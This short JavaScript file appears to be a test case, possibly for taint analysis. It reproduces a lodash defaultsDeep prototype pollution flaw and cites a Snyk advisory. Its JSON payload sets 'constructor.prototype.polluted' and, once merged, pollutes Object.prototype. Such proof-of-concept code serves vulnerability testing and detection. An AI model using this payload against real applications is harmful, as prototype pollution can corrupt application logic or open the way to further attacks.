//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
 
  const mergeFn = require("lodash").defaultsDeep;
  const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
   

  mergeFn.__x_toTaint = true;
  mergeFn({}, JSON.parse(payload));
// End of file
